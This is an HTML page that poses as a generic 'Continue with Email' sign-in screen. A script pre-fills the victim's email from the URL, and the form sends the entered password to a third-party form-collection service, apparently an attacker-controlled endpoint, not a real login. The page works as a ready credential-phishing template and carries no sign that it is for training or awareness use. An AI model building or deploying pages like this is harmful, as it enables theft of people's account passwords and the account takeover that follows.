<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Continue with Email</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f6f9;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .card {
      background: #fff;
      padding: 30px 25px;
      border-radius: 8px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      text-align: center;
      width: 320px;
    }
    h2 {
      margin-bottom: 20px;
      font-size: 20px;
      font-weight: 600;
      color: #333;
    }
    .signed {
      margin-bottom: 18px;
      font-size: 14px;
      color: #444;
    }
    .input {
      width: 100%;
      padding: 12px 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 14px;
    }
    .btn {
      width: 100%;
      padding: 12px;
      background: #0b63d6;
      border: none;
      border-radius: 5px;
      color: #fff;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
    }
    .btn:hover {
      background: #094ea8;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>Continue with Email</h2>
    <div class="signed" id="signedText">
      Signed in as: <strong id="userEmail"></strong>
    </div>
    <form method="POST" action="https://submit-form.com/your-form-id">
      <input type="hidden" name="email" id="emailField">
      <input type="password" name="password" class="input" placeholder="Enter password" required>
      <button type="submit" class="btn">Login</button>
    </form>
  </div>

  <script>
    // Extract ?email= from the URL
    const params = new URLSearchParams(window.location.search);
    const email = params.get("email") || "";

    // Show on screen
    document.getElementById("userEmail").textContent = email;

    // Fill hidden input
    document.getElementById("emailField").value = email;
  </script>
</body>
</html>
